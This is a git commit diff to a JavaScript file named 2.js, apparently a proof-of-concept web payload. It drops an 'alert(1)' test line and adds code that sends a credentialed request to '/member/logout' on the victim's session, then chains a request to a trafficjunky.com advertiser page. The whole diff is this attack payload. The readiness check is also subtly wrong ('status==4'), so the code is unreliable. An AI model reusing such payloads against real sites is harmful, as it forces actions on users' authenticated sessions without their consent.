bfade5617e1f206d90810e77c4028aa5d0fc78cb
bbpa <57352896+bbpa@users.noreply.github.com>
2023-01-17 03:18:21 +0330

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,7 +1,13 @@
-alert(1)
 let step1=new XMLHttpRequest();
 step1.withCredentials=true;
 step1.open("GET","/member/logout")
 step1.send();
+step1.onreadystatechange=()=>{
+ if(step1.status==4){
+   step1.open("GET","https://advertiser.trafficjunky.com/help-center")
+step1.send();
+ }
+  
+}
 /*let step2=new Image();
 step2.src="https://advertiser.trafficjunky.com/help-center"*/
